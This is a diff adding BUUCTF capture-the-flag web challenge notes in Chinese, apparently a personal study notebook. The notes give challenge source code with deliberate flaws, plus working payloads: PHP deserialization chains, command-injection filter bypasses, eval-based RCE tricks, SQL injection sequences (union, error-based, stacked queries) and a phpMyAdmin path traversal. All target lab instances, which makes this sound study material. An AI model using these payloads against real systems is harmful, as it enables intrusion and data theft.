@@ -6,7 +6,7 @@ categories:
 tags:
 - Security
 ---
-//Description: CTF学习刷题笔记。记录刷 [BUUCTF](https://buuoj.cn/challenges) 题过程中遇到的问题。上传问题分类
+//Description: CTF学习刷题笔记。记录刷 [BUUCTF](https://buuoj.cn/challenges) 题过程中遇到的问题。上传问题和代码审计问题分类
 
 //Create Date: 2026-02-08 16:40:20
 
@@ -565,4 +565,555 @@ X-Forwarded-For: 127.0.0.1
 you are in sandbox e6305cd14dbe6e1fc4041d81cb3fc9eeStarting Nmap 7.70 ( https://nmap.org ) at 2026-02-13 07:06 UTC
 ```
 需要连接"http://043fd53a-cb05-4be3-b1e3-51017ac9017d.node5.buuoj.cn:81/e6305cd14dbe6e1fc4041d81cb3fc9ee/test.php"才显示flag
-### []()
+### [easy_web](https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_web)
+```sh
+GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd= HTTP/1.1
+```
+`TXpVek5UTTFNbVUzTURabE5qYz0`->base64->base64->ascii hex->`555.png`，反向操作`index.php`得到源码
+```php
+<?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header('content-type:text/html;charset=utf-8');
+$cmd = $_GET['cmd'];
+if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
+    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
+$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
+
+$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
+if (preg_match("/flag/i", $file)) {
+    echo '<img src ="./ctf3.jpeg">';
+    die("xixiï½ no flag");
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
+    echo "<br>";
+}
+echo $cmd;
+echo "<br>";
+if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
+    echo("forbid ~");
+    echo "<br>";
+} else {
+    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
+        echo `$cmd`;
+    } else {
+        echo ("md5 is funny ~");
+    }
+}
+
+?>
+```
+md5强绕过
+```sh
+POST /index.php?img=TW1ZMk5UYzBOak15Wmpjd05qRTNNemN6TnpjMk5BPT0=&cmd=ca\t%20/flag HTTP/1.1
+Host: dac5773f-21c6-449b-9cad-7cddec03f963.node5.buuoj.cn:81
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://dac5773f-21c6-449b-9cad-7cddec03f963.node5.buuoj.cn:81/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 393
+
+a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+```
+### [Ezoop](https://buuoj.cn/challenges#[MRCTF2020]Ezpop)
+```php
+Welcome to index.php
+<?php
+//flag is in flag.php
+//WTF IS THIS?
+//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+//And Crack It!
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file='index.php'){
+        $this->source = $file;
+        echo 'Welcome to '.$this->source."<br>";
+    }
+    public function __toString(){
+        return $this->str->source;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
+        }
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+
+if(isset($_GET['pop'])){
+    @unserialize($_GET['pop']);
+}
+else{
+    $a=new Show;
+    highlight_file(__FILE__);
+}
+```
+反序列化
+```php
+<?php
+class Modifier {
+    protected  $var = "php://filter/read=convert.base64-encode/resource=flag.php";
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+$Modifier = new Modifier;
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+$Test = new Test;
+$Test->p = $Modifier;
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file='index.php'){
+        $this->source = $file;
+        echo 'Welcome to '.$this->source."<br>";
+    }
+    public function __toString(){
+        return $this->str->source;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
+        }
+    }
+}
+$Show1 = new Show();
+$Show2 = new Show();
+$Show1->source = $Show2;
+$Show2->str = $Test;
+echo serialize($Show1)."\n---\n";
+echo urlencode(serialize($Show1))."\n\n";
+?>
+```
+### [PYWebsite](https://buuoj.cn/challenges#[MRCTF2020]PYWebsite)
+```php
+    function validate(){
+      var code = document.getElementById("vcode").value;
+      if (code != ""){
+        if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
+          alert("您通过了验证！");
+          window.location = "./flag.php"
+        }else{
+          alert("你的授权码不正确！");
+        }
+      }else{
+        alert("请输入授权码");
+      }
+      
+    }
+```
+md5爆破失败，前端可直接绕过，请求的最后两行空行需要，否则会报Timeout请求错误
+```sh
+GET /flag.php HTTP/1.
+
+X-Forwarded-For: 127.0.0.1
+
+
+```
+### [easy_serialize_php](https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php)
+```php
+<?php
+
+$function = @$_GET['f'];
+
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo '<a href="index.php?f=highlight_file">source_code</a>';
+}
+
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+}
+```
+`flflagag`等可以绕过filter, 但序列化后前面的长度不变，以此错位破题
+```sh
+GET /index.php?f=show_image HTTP/1.1
+
+Content-Type: application/x-www-form-urlencoded
+
+_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+
+_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+```
+### [ReadlezPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)
+```php
+<?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this->a = "Y-m-d h:i:s";
+        $this->b = "date";
+    }
+    public function __destruct(){
+        $a = $this->a;
+        $b = $this->b;
+        echo $b($a);
+    }
+}
+$c = new HelloPhp;
+
+if(isset($_GET['source']))
+{;
+    highlight_file(__FILE__);
+    die(0);
+}
+
+@$ppp = unserialize($_GET["data"]);
+```
+从phpinfo()中查看flag文件名或flag内容，才发现system/exec等都被disable了，怪不得system(ls)什么输出都没有。
+```sh
+GET /time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";} HTTP/1.1
+```
+### [Love Math](https://buuoj.cn/challenges#[CISCN%202019%20%E5%88%9D%E8%B5%9B]Love%20Math)
+```php
+<?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET['c'];
+    if (strlen($content) >= 80) {
+        die("太长了不会算");
+    }
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $content)) {
+            die("请不要输入奇奇怪怪的字符");
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die("请不要输入奇奇怪怪的函数");
+        }
+    }
+    //帮你算出答案
+    eval('echo '.$content.';');
+}
+```
+有用的函数：十进制/十六进制`dechex/hexdex`，十进制/二进制`bindec/decbin`，任意进制`base_convert`，十进制八进制`decoct/octdec`。其它函数`hex2bin/bin2hex`。
+```sh
+system(ls) -> base_convert(1751504350,10,36)(base_convert(784,10,36))
+
+dex2bin = base_convert(25071743913,10,36) -> base_convert(bin2hex,36,10) = 25071743913
+
+hex2bin = base_convert(37907361743,10,36) -> base_convert(hex2bin,36,10) = 37907361743
+
+ls / = hex2bin(dechex(1819484207)) = base_convert(37907361743,10,36)(dechex(1819484207))
+
+exec(ls /) -> base_convert(696468,10,36)(dec(1819484207))
+```
+或者构造_GET['xxx']
+```sh
+_GET = hex2bin(dechex(1598506324))
+
+GET /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=ls%20/ HTTP/1.1
+
+$c=_GET['a']
+```
+### [禁止套娃](https://buuoj.cn/challenges#[GXYCTF2019]%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83)
+```sh
+./dirsearch.py -u http://3e5ded7b-55f6-4240-8976-46a99e9662eb.node5.buuoj.cn:81/ -e "*" --delay 0.1 -t 1 -i 200,403
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz
+HTTP method: GET | Threads: 1 | Wordlist size: 15045
+
+Target: http://3e5ded7b-55f6-4240-8976-46a99e9662eb.node5.buuoj.cn:81/
+
+[15:16:33] Scanning: 
+[15:18:40] 403 -   571B - /.git/
+```
+git
+```php
+<?php
+include "flag.php";
+echo "flag在哪里呢？<br>";
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?>
+```
+第一层：过滤文件直接访问；第二层：只允许不带参函数，可嵌套；第三层：过滤部分关键字
+```sh
+GET /?exp=show_source(array_rand(array_flip(scandir(pos(localeconv()))))); HTTP/1.1
+```
+
+# SQL类
+## Basic
+### [Juice Shop](https://buuoj.cn/challenges#Juice%20Shop)
+SQL注入+爆破
+### [2019 EasySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)
+SQL漏洞，`1' or 1=1#`登录成功
+```
+GET /check.php?username=1%27+or+1%3D1%23&password=1 HTTP/1.1
+```
+### [2019 LoveSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL)
+sql的select没有group_concat一般只回显一条记录
+```sql
+username=1&password=2' or 1='1' group by 3#
+username=1&password=2%27%20or%201=%271%27%20group%20by%203%23
+
+> Unknown column '4' in 'group statement'
+
+username=1&password=2%27%20union%20select%201,2,3%23
+> 2,3
+username=1&password=2%27%20union%20select%201,database(),3%23
+> geek
+username=1&password=2%27%20union%20select%201,group_concat(table_name),3%20from%20mysql.innodb_table_stats%20where%20database_name='geek'%23
+> geekuser,l0ve1ysq1
+username=1&password=2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema='geek'%20and%20table_name='geekuser'%23
+> username,password
+> id,username,password (table_name='l0ve1ysq1')
+username=1&password=2%27%20union%20select%201,username,password%20from%20geek.geekuser%23
+> admin, 251c39b7cef2c57ab4eb885d375d723a
+> cl4y, wo_tai_nan_le
+username=1&password=2%27%20union%20select%201,2,group_concat(id,username,password)%20from%20geek.l0ve1ysq1%23
+```
+### [2019 BabySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL)
+```
+GET /check.php?username=admin&password=1'%20order%20by%206%20--%20- HTTP/1.1
+> MariaDB server version for the right syntax to use near 'der  6 -- -'' at line 1
+GET /check.php?username=admin&password=1'oorr'1'='1'%20--%20- HTTP/1.1
+```
+过滤了`or`和`by`
+```
+GET /check.php?username=admin&password=1'union%20select1,2,3%20--%20- HTTP/1.1
+> MariaDB server version for the right syntax to use near '1,2,3 -- -'' at line 1
+```
+过滤了`union`和`select`，尝试带其它关键词的发现也过滤了`where`、`from`、`and`。
+```
+GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,2,3--%20- HTTP/1.1
+> 2, 3
+GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,group_concat(table_name),3%20ffromrom%20mysql.innodb_table_stats%20wwherehere%20database_name='geek'--%20- HTTP/1.1
+> b4bsql,geekuser
+GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,group_concat(column_name),3%20ffromrom%20infoorrmation_schema.columns%20wwherehere%20table_schema='geek'%20aandnd%20table_name='geekuser'--%20- HTTP/1.1
+> id,username,password (b4bsql同)
+......
+```
+### [2019 HardSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL)
+报错注入
+```
+GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,database(),0x7e),1));%23 HTTP/1.1
+> XPATH syntax error: '~geek~'
+GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1));%23 HTTP/1.1
+> XPATH syntax error: '~information_schema,performance_'
+GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1));%23 HTTP/1.1
+> XPATH syntax error: '~H4rDsq1~'
+GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1));%23 HTTP/1.1
+> XPATH syntax error: '~id,username,password~'
+GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(geek.H4rDsq1)),0x7e),1));%23 HTTP/1.1
+> XPATH syntax error: '~1flagflag{7acb6ee1-7e45-43ba-95'
+GET /check.php?username=1&password=1'or(updatexml(1,right(concat(0x7e,(select(group_concat(password,id))from(geek.H4rDsq1)),0x7e),40),1));%23 HTTP/1.1
+> XPATH syntax error: 'ee1-7e45-43ba-9594-00cbbe785abe}'
+```
+### [2019 FinalSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]FinalSQL)
+盲注。。。
+
+## Web
+### [Blacklist](https://buuoj.cn/challenges#[GYCTF2020]Blacklist)
+```sql
+1 or extractvalue(1, (select database()) )
+
+return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
+
+1';show databases;#
+
+array(1) {
+  [0]=>
+  string(11) "ctftraining"
+}
+
+1';show tables;#
+
+array(1) {
+  [0]=>
+  string(8) "FlagHere"
+}
+
+1'; show columns from `FlagHere` ; #
+
+array(6) {
+  [0]=>
+  string(4) "flag"
+  [1]=>
+  string(12) "varchar(100)"
+  [2]=>
+  string(2) "NO"
+  [3]=>
+  string(0) ""
+  [4]=>
+  NULL
+  [5]=>
+  string(0) ""
+}
+
+1';PREPARE hacker from concat('s','elect', ' * from `FlagHere` ');EXECUTE hacker;#
+
+return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
+
+1';EXECUTE IMMEDIATE concat('s','elect',' * from `FlagHere` ');#
+```
+### [BabySQli](https://buuoj.cn/challenges#[GXYCTF2019]BabySQli)
+```sh
+name=admin'#&pw=1
+
+wrong pass!
+
+name=admin';show%20tables;#&pw=1
+
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'show tables;#'' at line 1
+
+name=admin';or%20show%20tables;#&pw=1
+
+do not hack me!
+```
+可知过滤了`or/database()`
+```sh
+name=admin'%20union%20select%201,2,3#&pw=1
+
+wrong pass!
+```
+F12及返回中都有注释，先base32再base64得到
+```php
+<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
+
+b"select * from user where username = '$name'"
+
+pw='abc'
+md5(pw.encode()).hexdigest()
+'900150983cd24fb0d6963f7d28e17f72'
+
+name=1'union%20select%201,'admin','900150983cd24fb0d6963f7d28e17f72'#&pw=abc
+```
+是怎么猜出pw用了md5的？？？
+### [I have a database](https://buuoj.cn/challenges#[GWCTF%202019]%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93)
+```sh
+ ./dirsearch.py -u http://08e377bc-2a2b-41f2-8df0-36cd7cd516f5.node5.buuoj.cn:81/ -e "*" --delay 0.1 -t 1 -i 200,403
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz
+HTTP method: GET | Threads: 1 | Wordlist size: 15045
+
+Target: http://08e377bc-2a2b-41f2-8df0-36cd7cd516f5.node5.buuoj.cn:81/
+
+[14:21:29] Scanning: 
+[14:24:54] 403 -   316B - /.php
+[14:45:09] 200 -    6KB - /favicon.ico
+[14:47:54] 200 -   184B - /index.html
+[14:54:14] 200 -   86KB - /phpinfo.php
+[14:54:53] 200 -   75KB - /phpmyadmin/
+[14:54:53] 200 -   20KB - /phpmyadmin/ChangeLog
+[14:54:53] 200 -   15KB - /phpmyadmin/doc/html/index.html
+[14:54:54] 200 -   75KB - /phpmyadmin/index.php
+[14:54:55] 200 -    1KB - /phpmyadmin/README
+[14:57:21] 200 -    36B - /robots.txt
+[14:58:02] 403 -   316B - /server-status
+[14:58:02] 403 -   316B - /server-status/
+
+Task Completed
+```
+phpmyadmin漏洞
+```sh
+http://08e377bc-2a2b-41f2-8df0-36cd7cd516f5.node5.buuoj.cn:81/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag
+```
